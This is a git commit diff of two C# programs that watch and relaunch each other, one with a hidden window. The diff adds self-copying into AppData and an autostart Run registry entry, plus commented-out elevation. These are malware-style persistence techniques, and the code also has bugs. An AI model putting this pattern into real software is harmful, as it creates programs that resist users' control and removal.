0cb4960ba0cd0464c75904d709129774c17b3b81
yaje996 <yaje996@users.noreply.github.com>
2018-07-08 19:06:02 +0200

    register

--- process/process/Program_process.cs
+++ process/process/Program_process.cs
@@ -5,6 +5,10 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Threading;
+using Microsoft.Win32;
+using System.IO;
+using System.Reflection;
+using System.Security.Permissions;
 
 namespace process
 {
@@ -13,20 +17,74 @@ namespace process
 
         static void Main(string[] args)
         {
+            string path = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+            string destinationDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             Process[] pname = Process.GetProcessesByName("process2");
+            Console.WriteLine(destinationDirectory);
             Console.WriteLine(pname.Length);
+            string appName = AppDomain.CurrentDomain.FriendlyName;
+
+            if (File.Exists(destinationDirectory + "\\" + appName))
+            {
+                Console.WriteLine("fichier existe");
+            }
+            else if (Directory.Exists(destinationDirectory))
+            {
+                File.Copy(path + "\\" + appName, destinationDirectory + "\\" + appName);
+                //File.Copy(destinationDirectory, path + "\\" + appName);
+                //File.Copy(@"C:\startup.log", @"C:\usr\startupcopy.log");
+            }
+
+            else
+            {
+                Directory.CreateDirectory(destinationDirectory);
+                //ajouter instructions
+            }
+
+
+            // Process.Start(path + "\\" + appName);
+            // System.Environment.Exit(1);
+
+
+
+            //Console.WriteLine(path + "\\" + appName);
+            //Console.WriteLine(appName);
+           // Console.ReadKey();
+
+
             
+            /*RegistryPermission f = new RegistryPermission(RegistryPermissionAccess.AllAccess, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            RegistryKey regKey = Registry.LocalMachine;
+
+            regKey = regKey.OpenSubKey("SOFTWARE");
+            regKey = regKey.OpenSubKey("Microsoft");
+            regKey = regKey.OpenSubKey("Windows");
+            regKey = regKey.OpenSubKey("CurrentVersion");
+            regKey = regKey.OpenSubKey("Run", true);
+            */
+            //RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            //RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            reg.SetValue(AppDomain.CurrentDomain.FriendlyName, path);
+            //rk.SetValue("application",.ExecutablePath.ToString());
+            //Console.WriteLine(AppDomain.CurrentDomain.FriendlyName);
+
+          //  Console.ReadKey();      //Va attendre une touche du clavier pour lancer la suite (ReadKey)
+            
+
             Process Myprocess = new Process();
-            Myprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Myprocess.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
             Myprocess.StartInfo.FileName = @"C:\Users\yann\source\repos\process\process2\bin\Debug\process2.exe";
             pname = Process.GetProcessesByName("process2");
-           
+          //  Myprocess.StartInfo.UseShellExecute = true;
+            //Myprocess.StartInfo.Verb = "runas";
+
             try
             {
                 while(true)
                 {
                     pname = Process.GetProcessesByName("process2");
-                    if (pname.Length == 0)
+                    if (pname.Length == 1)
                     {
                         
                         Myprocess.Start();
--- process/process2/Program_process2.cs
+++ process/process2/Program_process2.cs
@@ -1,7 +1,11 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
+using System.Reflection;
+using System.Security.Permissions;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -11,20 +15,71 @@ namespace process2
     {
         static void Main(string[] args)
         {
+            string path = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+            string destinationDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             Process[] pname = Process.GetProcessesByName("process");
+            Console.WriteLine(destinationDirectory);
             Console.WriteLine(pname.Length);
+            string appName = AppDomain.CurrentDomain.FriendlyName;
+
+            if (File.Exists(destinationDirectory + "\\" + appName))
+            {
+                Console.WriteLine("fichier existe");
+            }
+            else if (Directory.Exists(destinationDirectory))
+            {
+                File.Copy(path + "\\" + appName, destinationDirectory + "\\" + appName);
+                //File.Copy(destinationDirectory, path + "\\" + appName);
+                //File.Copy(@"C:\startup.log", @"C:\usr\startupcopy.log");
+            }
+
+            else
+            {
+                Directory.CreateDirectory(destinationDirectory);
+                //ajouter instructions
+            }
+
+
+            // Process.Start(path + "\\" + appName);
+            // System.Environment.Exit(1);
+
+
+
+            //Console.WriteLine(path + "\\" + appName);
+            //Console.WriteLine(appName);
+          // Console.ReadKey();
+            /*
+            RegistryPermission f = new RegistryPermission(RegistryPermissionAccess.AllAccess, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            RegistryKey regKey = Registry.LocalMachine;
+
+            regKey = regKey.OpenSubKey("SOFTWARE");
+            regKey = regKey.OpenSubKey("Microsoft");
+            regKey = regKey.OpenSubKey("Windows");
+            regKey = regKey.OpenSubKey("CurrentVersion");
+            regKey = regKey.OpenSubKey("Run", true);*/
+
+            //RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            //RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            reg.SetValue(AppDomain.CurrentDomain.FriendlyName, path);
+            //rk.SetValue("application",.ExecutablePath.ToString());
+            //Console.WriteLine(AppDomain.CurrentDomain.FriendlyName);
+
+           // Console.ReadKey();      //Va attendre une touche du clavier pour lancer la suite (ReadKey)
 
             Process Myprocess = new Process();
             Myprocess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             Myprocess.StartInfo.FileName = @"C:\Users\yann\source\repos\process\process\bin\Debug\process.exe";
             pname = Process.GetProcessesByName("process");
+           // Myprocess.StartInfo.UseShellExecute = true;
+            //Myprocess.StartInfo.Verb = "runas";
 
             try
             {
                 while (true)
                 {
                     pname = Process.GetProcessesByName("process");
-                    if (pname.Length == 0)
+                    if (pname.Length == 1)
                     {
 
                         Myprocess.Start();
